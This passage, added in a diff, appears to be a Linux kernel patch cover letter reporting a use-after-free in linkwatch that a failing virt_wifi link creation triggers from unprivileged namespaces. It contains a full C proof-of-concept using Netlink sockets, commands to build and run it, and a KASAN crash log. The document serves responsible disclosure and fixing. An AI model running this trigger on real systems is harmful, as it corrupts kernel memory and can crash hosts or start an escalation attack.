+commit eec517cdb481 ("net: Add IF_OPER_TESTING")
+later added netif_testing_*() with the same missing check. virt_wifi
+only makes the old hole easy to hit from rtnetlink.
+
+The local crash capture used kernel.panic_on_warn=0. With the default
+panic_on_warn=1, the same path usually panics earlier in free_netdev() /
+ref_tracker_dir_exit() because the stale linkwatch netdev_hold() is
+still outstanding.
+
+This is an rtnetlink RTM_NEWLINK creation path, not a packet-sequence
+or protocol-state trigger. packetdrill cannot express creating a dummy
+lower device, setting IFLA_OPERSTATE, and issuing a failing
+RTM_NEWLINK(kind="virt_wifi") request, so the PoC uses Netlink sockets.
+
+The bug is reachable by an unprivileged user via user and net
+namespaces. On the unpatched 7.2.0-g2f38e26a5741 kernel, uid=1002
+plus unshare of CLONE_NEWUSER|CLONE_NEWNET is enough, because the
+path only needs netns-local CAP_NET_ADMIN. Repeating the failing
+virt_wifi RTM_NEWLINK queues a NETREG_UNINITIALIZED kmalloc-4k
+net_device onto lweventlist, after which free_netdev() frees it.
+The later linkwatch path can then touch that freed list entry.
+
+The attached crash log is a KASAN slab-use-after-free captured on
+net.git 2f38e26a5741 (7.2.0-g2f38e26a5741) in QEMU.
+./scripts/decode_stacktrace.sh was applied to that log. An earlier
+6.12.95 capture showed the later worker GPF on the same freed list
+entry; this capture reports the UAF when a later
+linkwatch_fire_event() list_add() touches a device already freed by
+rtnl_newlink().
+
+On this QEMU guest, querying the dummy ifindex with RTM_GETLINK
+blocked in recv, so the attached reproducer uses SIOCGIFINDEX
+instead. The rest of the trigger is unchanged.
+
+Reproducer:
+
+    gcc -O2 -static -o poc poc.c
+    unshare -Urn ./poc
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <linux/if.h>
+#include <linux/if_link.h>
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+
+#ifndef IFLA_INFO_KIND
+#define IFLA_INFO_KIND 1
+#endif
+
+static int addattr_l(struct nlmsghdr *n, size_t maxlen, int type,
+		     const void *data, size_t alen)
+{
+	size_t len = RTA_LENGTH(alen);
+	size_t newlen = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
+	struct rtattr *rta;
+
+	if (newlen > maxlen) {
+		errno = EOVERFLOW;
+		return -1;
+	}
+
+	rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
+	rta->rta_type = type;
+	rta->rta_len = len;
+	if (alen)
+		memcpy(RTA_DATA(rta), data, alen);
+	n->nlmsg_len = newlen;
+	return 0;
+}
+
+static int addattr8(struct nlmsghdr *n, size_t maxlen, int type, uint8_t data)
+{
+	return addattr_l(n, maxlen, type, &data, sizeof(data));
+}
+
+static int addattr32(struct nlmsghdr *n, size_t maxlen, int type, uint32_t data)
+{
+	return addattr_l(n, maxlen, type, &data, sizeof(data));
+}
+
+static int addattrstrz(struct nlmsghdr *n, size_t maxlen, int type,
+		       const char *str)
+{
+	return addattr_l(n, maxlen, type, str, strlen(str) + 1);
+}
+
+static struct rtattr *addattr_nest(struct nlmsghdr *n, size_t maxlen, int type)
+{
+	struct rtattr *nest;
+
+	nest = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
+	if (addattr_l(n, maxlen, type, NULL, 0) < 0)
+		return NULL;
+	return nest;
+}
+
+static void addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)
+{
+	nest->rta_len = (char *)n + n->nlmsg_len - (char *)nest;
+}
+
+static int nl_talk(int fd, struct nlmsghdr *nlh)
+{
+	struct sockaddr_nl nladdr = {
+		.nl_family = AF_NETLINK,
+	};
+	struct iovec iov = {
+		.iov_base = nlh,
+		.iov_len = nlh->nlmsg_len,
+	};
+	struct msghdr msg = {
+		.msg_name = &nladdr,
+		.msg_namelen = sizeof(nladdr),
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+	};
+	char buf[8192];
+	ssize_t len;
+
+	if (sendmsg(fd, &msg, 0) < 0)
+		return -1;
+
+	for (;;) {
+		struct nlmsghdr *h;
+
+		len = recv(fd, buf, sizeof(buf), 0);
+		if (len < 0) {
+			if (errno == EINTR)
+				continue;
+			return -1;
+		}
+
+		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, (unsigned int)len);
+		     h = NLMSG_NEXT(h, len)) {
+			if (h->nlmsg_seq != nlh->nlmsg_seq)
+				continue;
+			if (h->nlmsg_type == NLMSG_ERROR) {
+				struct nlmsgerr *err = NLMSG_DATA(h);
+
+				if (h->nlmsg_len < NLMSG_LENGTH(sizeof(*err))) {
+					errno = EPROTO;
+					return -1;
+				}
+				if (err->error == 0)
+					return 0;
+				errno = -err->error;
+				return -1;
+			}
+		}
+	}
+}
+
+static int open_rtnl(void)
+{
+	struct sockaddr_nl local = {
+		.nl_family = AF_NETLINK,
+	};
+	int fd;
+
+	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
+	if (fd < 0)
+		return -1;
+	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {
+		close(fd);
+		return -1;
+	}
+	return fd;
+}
+
+static uint32_t next_seq(void)
+{
+	struct timespec ts;
+
+	clock_gettime(CLOCK_MONOTONIC, &ts);
+	return (uint32_t)(ts.tv_nsec ^ ts.tv_sec ^ getpid());
+}
+
+static int create_dummy(int fd, const char *ifname)
+{
+	struct {
+		struct nlmsghdr nlh;
+		struct ifinfomsg ifi;
+		char buf[512];
+	} req = {
+		.nlh = {
+			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
+			.nlmsg_type = RTM_NEWLINK,
+			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
+				       NLM_F_CREATE | NLM_F_EXCL,
+			.nlmsg_seq = next_seq(),
+		},
+		.ifi = {
+			.ifi_family = AF_UNSPEC,
+		},
+	};
+	struct rtattr *linkinfo;
+
+	if (addattrstrz(&req.nlh, sizeof(req), IFLA_IFNAME, ifname) < 0)
+		return -1;
+
+	linkinfo = addattr_nest(&req.nlh, sizeof(req), IFLA_LINKINFO);
+	if (!linkinfo)
+		return -1;
+
+	if (addattrstrz(&req.nlh, sizeof(req), IFLA_INFO_KIND, "dummy") < 0)
+		return -1;
+	addattr_nest_end(&req.nlh, linkinfo);
+
+	return nl_talk(fd, &req.nlh);
+}
+
+static int set_link_up(int fd, int ifindex)
+{
+	struct {
+		struct nlmsghdr nlh;
+		struct ifinfomsg ifi;
+		char buf[128];
+	} req = {
+		.nlh = {
+			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
+			.nlmsg_type = RTM_SETLINK,
+			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
+			.nlmsg_seq = next_seq(),
+		},
+		.ifi = {
+			.ifi_family = AF_UNSPEC,
+			.ifi_index = ifindex,
+			.ifi_change = IFF_UP,
+			.ifi_flags = IFF_UP,
+		},
+	};
+
+	return nl_talk(fd, &req.nlh);
+}
+
+static int set_operstate(int fd, int ifindex, uint8_t operstate)
+{
+	struct {
+		struct nlmsghdr nlh;
+		struct ifinfomsg ifi;
+		char buf[128];
+	} req = {
+		.nlh = {
+			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
+			.nlmsg_type = RTM_SETLINK,
+			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
+			.nlmsg_seq = next_seq(),
+		},
+		.ifi = {
+			.ifi_family = AF_UNSPEC,
+			.ifi_index = ifindex,
+		},
+	};
+
+	if (addattr8(&req.nlh, sizeof(req), IFLA_OPERSTATE, operstate) < 0)
+		return -1;
+
+	return nl_talk(fd, &req.nlh);
+}
+
+static int trigger_virt_wifi_uaf(int fd, int lower_ifindex)
+{
+	const char *bad_name = "bad/name";
+	struct {
+		struct nlmsghdr nlh;
+		struct ifinfomsg ifi;
+		char buf[512];
+	} req = {
+		.nlh = {
+			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
+			.nlmsg_type = RTM_NEWLINK,
+			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
+				       NLM_F_CREATE | NLM_F_EXCL,
+			.nlmsg_seq = next_seq(),
+		},
+		.ifi = {
+			.ifi_family = AF_UNSPEC,
+		},
+	};
+	struct rtattr *linkinfo;
+
+	if (addattrstrz(&req.nlh, sizeof(req), IFLA_IFNAME, bad_name) < 0)
+		return -1;
+	if (addattr32(&req.nlh, sizeof(req), IFLA_LINK, lower_ifindex) < 0)
+		return -1;
+
+	linkinfo = addattr_nest(&req.nlh, sizeof(req), IFLA_LINKINFO);
+	if (!linkinfo)
+		return -1;
+	if (addattrstrz(&req.nlh, sizeof(req), IFLA_INFO_KIND, "virt_wifi") < 0)
+		return -1;
+	addattr_nest_end(&req.nlh, linkinfo);
+
+	return nl_talk(fd, &req.nlh);
+}
+
+static int query_link(int fd, const char *ifname, int *ifindex, uint8_t *operstate)
+{
+	struct {
+		struct nlmsghdr nlh;
+		struct ifinfomsg ifi;
+		char buf[256];
+	} req = {
+		.nlh = {
+			.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg)),
+			.nlmsg_type = RTM_GETLINK,
+			.nlmsg_flags = NLM_F_REQUEST,
+			.nlmsg_seq = next_seq(),
+		},
+		.ifi = {
+			.ifi_family = AF_UNSPEC,
+		},
+	};
+	struct sockaddr_nl nladdr = {
+		.nl_family = AF_NETLINK,
+	};
+	struct iovec iov = {
+		.iov_base = &req,
+		.iov_len = req.nlh.nlmsg_len,
+	};
+	struct msghdr msg = {
+		.msg_name = &nladdr,
+		.msg_namelen = sizeof(nladdr),
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+	};
+	char buf[4096];
+	ssize_t len;
+
+	if (addattrstrz(&req.nlh, sizeof(req), IFLA_IFNAME, ifname) < 0)
+		return -1;
+
+	if (sendmsg(fd, &msg, 0) < 0)
+		return -1;
+
+	for (;;) {
+		struct nlmsghdr *h;
+
+		len = recv(fd, buf, sizeof(buf), 0);
+		if (len < 0) {
+			if (errno == EINTR)
+				continue;
+			return -1;
+		}
+
+		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, (unsigned int)len);
+		     h = NLMSG_NEXT(h, len)) {
+			struct ifinfomsg *ifi;
+			struct rtattr *rta;
+			int attrlen;
+
+			if (h->nlmsg_seq != req.nlh.nlmsg_seq)
+				continue;
+			if (h->nlmsg_type == NLMSG_ERROR) {
+				struct nlmsgerr *err = NLMSG_DATA(h);
+
+				if (err->error == 0) {
+					errno = ENOENT;
+					return -1;
+				}
+				errno = -err->error;
+				return -1;
+			}
+			if (h->nlmsg_type != RTM_NEWLINK)
+				continue;
+
+			ifi = NLMSG_DATA(h);
+			if (ifindex)
+				*ifindex = ifi->ifi_index;
+			if (operstate)
+				*operstate = IF_OPER_UNKNOWN;
+
+			attrlen = h->nlmsg_len - NLMSG_LENGTH(sizeof(*ifi));
+			for (rta = IFLA_RTA(ifi); RTA_OK(rta, attrlen);
+			     rta = RTA_NEXT(rta, attrlen)) {
+				if (operstate && rta->rta_type == IFLA_OPERSTATE &&
+				    RTA_PAYLOAD(rta) >= sizeof(uint8_t))
+					*operstate = *(uint8_t *)RTA_DATA(rta);
+			}
+			return 0;
+		}
+	}
+}
+
+static const char *operstate_name(uint8_t operstate)
+{
+	switch (operstate) {
+	case IF_OPER_NOTPRESENT:
+		return "notpresent";
+	case IF_OPER_DOWN:
+		return "down";
+	case IF_OPER_LOWERLAYERDOWN:
+		return "lowerlayerdown";
+	case IF_OPER_TESTING:
+		return "testing";
+	case IF_OPER_DORMANT:
+		return "dormant";
+	case IF_OPER_UP:
+		return "up";
+	case IF_OPER_UNKNOWN:
+	default:
+		return "unknown";
+	}
+}
+
+
+static int ifname_to_index(const char *ifname)
+{
+	struct ifreq ifr;
+	int s, ifindex;
+
+	s = socket(AF_INET, SOCK_DGRAM, 0);
+	if (s < 0)
+		return -1;
+	memset(&ifr, 0, sizeof(ifr));
+	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
+	if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
+		close(s);
+		return -1;
+	}
+	ifindex = ifr.ifr_ifindex;
+	close(s);
+	return ifindex;
+}
+
+static int read_sysfs_operstate(const char *ifname, char *buf, size_t buflen)
+{
+	char path[128];
+	FILE *f;
+	size_t n;
+
+	snprintf(path, sizeof(path), "/sys/class/net/%s/operstate", ifname);
+	f = fopen(path, "r");
+	if (!f)
+		return -1;
+	if (!fgets(buf, buflen, f)) {
+		fclose(f);
+		return -1;
+	}
+	fclose(f);
+	n = strlen(buf);
+	if (n && buf[n - 1] == '\n')
+		buf[n - 1] = '\0';
+	return 0;
+}
+
+int main(int argc, char **argv)
+{
+	char lower_name[IFNAMSIZ];
+	long attempts = 1024;
+	int fd;
+	int ifindex;
+	uint8_t operstate;
+	long i;
+
+	if (argc > 1) {
+		char *end;
+
+		errno = 0;
+		attempts = strtol(argv[1], &end, 0);
+		if (errno || *end != '\0' || attempts <= 0) {
+			fprintf(stderr, "invalid attempt count: %s\n", argv[1]);
+			return 1;
+		}
+	}
+
+	setvbuf(stdout, NULL, _IONBF, 0);
+	setvbuf(stderr, NULL, _IONBF, 0);
+
+	snprintf(lower_name, sizeof(lower_name), "vwlower%d", getpid());
+
+	fd = open_rtnl();
+	if (fd < 0) {
+		perror("open_rtnl");
+		return 1;
+	}
+
+	if (create_dummy(fd, lower_name) < 0) {
+		perror("create_dummy");
+		close(fd);
+		return 1;
+	}
+
+	ifindex = ifname_to_index(lower_name);
+	if (ifindex <= 0) {
+		perror("ifname_to_index");
+		close(fd);
+		return 1;
+	}
+
+	printf("created lower device %s (ifindex %d)\n", lower_name, ifindex);
+
+	if (set_link_up(fd, ifindex) < 0) {
+		perror("set_link_up");
+		close(fd);
+		return 1;
+	}
+
+	if (set_operstate(fd, ifindex, IF_OPER_DORMANT) < 0) {
+		perror("set_operstate");
+		close(fd);
+		return 1;
+	}
+
+	{
+		char oper_buf[32];
+
+		if (read_sysfs_operstate(lower_name, oper_buf, sizeof(oper_buf)) < 0)
+			printf("%s ifindex %d, sysfs operstate unavailable: %s\n",
+			       lower_name, ifindex, strerror(errno));
+		else
+			printf("%s ifindex %d, sysfs operstate: %s\n",
+			       lower_name, ifindex, oper_buf);
+	}
+	printf("triggering %ld virt_wifi registration failures with invalid ifname \"bad/name\"\n",
+	       attempts);
+
+	for (i = 1; i <= attempts; i++) {
+		if (trigger_virt_wifi_uaf(fd, ifindex) == 0) {
+			printf("[%ld] unexpectedly created virt_wifi device\n", i);
+			continue;
+		}
+
+		if (errno != EINVAL)
+			printf("[%ld] virt_wifi create error: %s\n",
+			       i, strerror(errno));
+
+		if ((i % 128) == 0)
+			printf("completed %ld attempts\n", i);
+	}
+
+	printf("waiting for linkwatch worker\n");
+	sleep(5);
+
+	close(fd);
+	return 0;
+}
+------END poc.c--------
+
+----BEGIN crash log----
+[    8.202464] net vwlower267: can't register_netdevice: -22
+[    8.203917] ==================================================================
+[    8.203925] BUG: KASAN: slab-use-after-free in __list_add_valid_or_report (lib/list_debug.c:32)
+[    8.203956] Read of size 8 at addr ffff888007024588 by task poc/267
+[    8.203958]
+[    8.203960] CPU: 1 UID: 0 PID: 267 Comm: poc Not tainted 7.2.0-g2f38e26a5741 #2 PREEMPT(lazy)
+[    8.203963] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[    8.203965] Call Trace:
+[    8.203966]  <TASK>
+[    8.203967]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
+[    8.203972]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)
+[    8.203975]  ? __pfx__raw_spin_lock_irqsave (kernel/locking/spinlock.c:190)
+[    8.203979]  ? __list_add_valid_or_report (lib/list_debug.c:32)
+[    8.203981]  kasan_report (mm/kasan/report.c:595)
+[    8.203984]  ? __list_add_valid_or_report (lib/list_debug.c:32)
+[    8.203986]  __list_add_valid_or_report (lib/list_debug.c:32)
+[    8.203989]  linkwatch_fire_event (include/linux/list.h:419 (discriminator 2) net/core/link_watch.c:129 (discriminator 2) net/core/link_watch.c:329 (discriminator 2) net/core/link_watch.c:319 (discriminator 2))
+[    8.203992]  netif_stacked_transfer_operstate (include/linux/netdevice.h:4665 net/core/dev.c:11199)
+[    8.203996]  virt_wifi_newlink (drivers/net/wireless/virtual/virt_wifi.c:560)
+[    8.203999]  ? nla_strscpy (lib/nlattr.c:795)
+[    8.204003]  rtnl_newlink (net/core/rtnetlink.c:3969 net/core/rtnetlink.c:4098 net/core/rtnetlink.c:4215)
+[    8.204005]  ? __pfx_rtnl_newlink (net/core/rtnetlink.c:2944)
+[    8.204008]  ? __pfx_stack_trace_consume_entry (usercopy_64.c:?)
+[    8.204011]  ? kernel_text_address (include/linux/kprobes.h:332 kernel/extable.c:123 kernel/extable.c:94)
+[    8.204014]  ? arch_stack_walk (arch/x86/kernel/stacktrace.c:26)
+[    8.204017]  ? __pfx_stack_trace_save (kernel/stacktrace.c:397)
+[    8.204020]  ? security_capable (security/security.c:660 (discriminator 8))
+[    8.204023]  ? __pfx_rtnl_newlink (net/core/rtnetlink.c:2944)
+[    8.204026]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
+[    8.204029]  ? __pfx_rtnetlink_rcv_msg (include/net/netlink.h:1307 (discriminator 1))
+[    8.204032]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
+[    8.204035]  ? __pfx_rtnetlink_rcv_msg (include/net/netlink.h:1307 (discriminator 1))
+[    8.204038]  ? __pfx_netlink_rcv_skb (include/linux/skbuff.h:2718)
+[    8.204040]  ? __asan_memset (mm/kasan/shadow.c:84 (discriminator 1))
+[    8.204043]  ? _copy_from_iter (include/linux/instrumented.h:146 lib/iov_iter.c:66 include/linux/iov_iter.h:30 include/linux/iov_iter.h:302 include/linux/iov_iter.h:330 lib/iov_iter.c:261 lib/iov_iter.c:272)
+[    8.204046]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
+[    8.204048]  ? __pfx_netlink_unicast (arch/x86/include/asm/bitops.h:202)
+[    8.204051]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
+[    8.204053]  ? __pfx_netlink_sendmsg (include/net/net_namespace.h:422)
+[    8.204056]  ? _copy_from_user (include/linux/instrumented.h:146 include/linux/uaccess.h:184 lib/usercopy.c:18)
+[    8.204059]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
+[    8.204062]  ? __pfx_____sys_sendmsg (net/socket.c:1156)
+[    8.204064]  ? __pfx_copy_msghdr_from_user (net/socket.c:2619)
+[    8.204066]  ? __wake_up (include/linux/spinlock.h:425 kernel/sched/wait.c:128 kernel/sched/wait.c:147)
+[    8.204069]  ___sys_sendmsg (net/socket.c:2767)
+[    8.204071]  ? __pfx____sys_sendmsg (net/socket.c:2654)
+[    8.204074]  ? fdget (include/linux/instrumented.h:82 include/linux/atomic/atomic-instrumented.h:49 fs/file.c:1194 fs/file.c:1208)
+[    8.204077]  __sys_sendmsg (net/socket.c:2799)
+[    8.204079]  ? __pfx___sys_sendmsg (net/socket.c:2780)
+[    8.204089]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
+[    8.204092]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[    8.204095] RIP: 0033:0x421534
+[    8.204097] Code: c2 c0 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b5 0f 1f 00 f3 0f 1e fa 80 3d 2d 4b 09 00 00 74 13 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 4c c3 0f 1f 00 55 48 89 e5 48 83 ec 20 89 55
+All code
+========
+   0:	c2 c0 ff             	ret    $0xffc0
+   3:	ff                   	(bad)
+   4:	ff f7                	push   %rdi
+   6:	d8 64 89 02          	fsubs  0x2(%rcx,%rcx,4)
+   a:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
+  11:	eb b5                	jmp    0xffffffffffffffc8
+  13:	0f 1f 00             	nopl   (%rax)
+  16:	f3 0f 1e fa          	endbr64
+  1a:	80 3d 2d 4b 09 00 00 	cmpb   $0x0,0x94b2d(%rip)        # 0x94b4e
+  21:	74 13                	je     0x36
+  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
+  28:	0f 05                	syscall
+  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
+  30:	77 4c                	ja     0x7e
+  32:	c3                   	ret
+  33:	0f 1f 00             	nopl   (%rax)
+  36:	55                   	push   %rbp
+  37:	48 89 e5             	mov    %rsp,%rbp
+  3a:	48 83 ec 20          	sub    $0x20,%rsp
+  3e:	89                   	.byte 0x89
+  3f:	55                   	push   %rbp
+
+Code starting with the faulting instruction
+===========================================
+   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
+   6:	77 4c                	ja     0x54
+   8:	c3                   	ret
+   9:	0f 1f 00             	nopl   (%rax)
+   c:	55                   	push   %rbp
+   d:	48 89 e5             	mov    %rsp,%rbp
+  10:	48 83 ec 20          	sub    $0x20,%rsp
+  14:	89                   	.byte 0x89
+  15:	55                   	push   %rbp
+[    8.204099] RSP: 002b:00007fffc3b290d8 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
+[    8.204102] RAX: ffffffffffffffda RBX: 00007fffc3b2b1a0 RCX: 0000000000421534
+[    8.204103] RDX: 0000000000000000 RSI: 00007fffc3b29100 RDI: 0000000000000003
+[    8.204105] RBP: 0000000000000003 R08: 000000000000000e R09: 00007fcd7daeb000
+[    8.204106] R10: 0000000000000001 R11: 0000000000000202 R12: 00007fffc3b2b1a0
+[    8.204107] R13: 0000000000000004 R14: 0000000000000002 R15: 00007fffc3b2b1d8
+[    8.204109]  </TASK>
+[    8.204110]
+[    8.204110] Allocated by task 267:
+[    8.204112]  kasan_save_stack (mm/kasan/common.c:57)
+[    8.204114]  kasan_save_track (mm/kasan/common.c:78)
+[    8.204116]  __kasan_kmalloc (mm/kasan/common.c:398 mm/kasan/common.c:415)
+[    8.204117]  __kvmalloc_node_noprof (include/linux/kasan.h:263 mm/slub.c:5414 mm/slub.c:7005)
+[    8.204120]  alloc_netdev_mqs (net/core/dev.c:12117 (discriminator 2))
+[    8.204123]  rtnl_create_link (net/core/rtnetlink.c:3777)
+[    8.204125]  rtnl_newlink (net/core/rtnetlink.c:3959 net/core/rtnetlink.c:4098 net/core/rtnetlink.c:4215)
+[    8.204127]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
+[    8.204129]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
+[    8.204131]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
+[    8.204133]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
+[    8.204135]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
+[    8.204137]  ___sys_sendmsg (net/socket.c:2767)
+[    8.204139]  __sys_sendmsg (net/socket.c:2799)
+[    8.204140]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
+[    8.204142]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[    8.204144]
+[    8.204144] Freed by task 267:
+[    8.204145]  kasan_save_stack (mm/kasan/common.c:57)
+[    8.204146]  kasan_save_track (mm/kasan/common.c:78)
+[    8.204148]  kasan_save_free_info (mm/kasan/generic.c:584)
+[    8.204150]  __kasan_slab_free (mm/kasan/common.c:253 mm/kasan/common.c:285)
+[    8.204152]  kfree (include/linux/kasan.h:235 mm/slub.c:2748 mm/slub.c:6499 mm/slub.c:6792)
+[    8.204154]  rtnl_newlink (net/core/rtnetlink.c:3973 net/core/rtnetlink.c:4098 net/core/rtnetlink.c:4215)
+[    8.204155]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
+[    8.204157]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
+[    8.204160]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
+[    8.204162]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
+[    8.204164]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
+[    8.204166]  ___sys_sendmsg (net/socket.c:2767)
+[    8.204167]  __sys_sendmsg (net/socket.c:2799)
+[    8.204168]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
+[    8.204170]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[    8.204172]
+[    8.204172] The buggy address belongs to the object at ffff888007024000
+[    8.204172]  which belongs to the cache kmalloc-4k of size 4096
+[    8.204174] The buggy address is located 1416 bytes inside of
+[    8.204174]  freed 4096-byte region [ffff888007024000, ffff888007025000)
+[    8.204176]
+[    8.204177] The buggy address belongs to the physical page:
+[    8.204178] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x7020
+[    8.204180] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
+[    8.204181] flags: 0x100000000000040(head|node=0|zone=1)
+[    8.204184] page_type: f5(slab)
+[    8.204186] raw: 0100000000000040 ffff8880010433c0 ffffea00001c1210 ffffea00001c3c10
+[    8.204188] raw: 0000000000000000 0000000000020002 00000000f5000000 0000000000000000
+[    8.204190] head: 0100000000000040 ffff8880010433c0 ffffea00001c1210 ffffea00001c3c10
+[    8.204191] head: 0000000000000000 0000000000020002 00000000f5000000 0000000000000000
+[    8.204193] head: 0100000000000003 fffffffffffffe01 00000000ffffffff 00000000ffffffff
+[    8.204194] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
+[    8.204195] page dumped because: kasan: bad access detected
+[    8.204196]
+[    8.204196] Memory state around the buggy address:
+[    8.204197]  ffff888007024480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[    8.204199]  ffff888007024500: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[    8.204200] >ffff888007024580: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[    8.204201]                       ^
+[    8.204202]  ffff888007024600: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[    8.204203]  ffff888007024680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[    8.204204] ==================================================================
+[    8.204205] Disabling lock debugging due to kernel taint
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (1):
+  net: fix linkwatch UAF on uninitialized netdev
+
+ net/core/link_watch.c | 7 ++++++-
+ 1 file changed, 6 insertions(+), 1 deletion(-)
+
+-- 
+2.43.0
 
